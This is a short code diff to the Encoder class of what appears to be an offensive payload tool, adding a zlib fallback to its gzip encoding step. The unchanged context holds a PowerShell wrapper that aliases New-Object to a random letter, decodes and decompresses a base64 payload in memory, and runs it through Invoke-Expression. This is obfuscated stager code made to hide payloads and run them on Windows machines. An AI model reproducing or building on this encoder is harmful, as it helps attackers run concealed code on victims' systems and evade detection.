@@ -1159,7 +1159,14 @@ class Encoder(object):
 
     def gzip(self):
         payload = self.payload
-        payload = __import__('base64').b64encode(__import__('gzip').compress(payload.encode())).decode()
+        try:
+            payload = __import__('base64').b64encode(__import__('gzip').compress(payload.encode())).decode()
+        except AttributeError:
+            import zlib
+            z = zlib.compressobj(-1, zlib.DEFLATED, 16+zlib.MAX_WBITS)
+            c = z.compress(payload.encode()) + z.flush()
+            payload = __import__('base64').b64encode(c).decode()
+
         if "windows" in self.platform:
             wrapper = '''powershell /c "sal {var} New-Object;IEx({var} IO.StreamReader(({var} IO.Compression.GZipStream([IO.MemoryStream][Convert]::FromBase64String('{payload}'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"'''
             payload = wrapper.format(var=chr(__import__('random').randint(97, 122)), payload=payload)
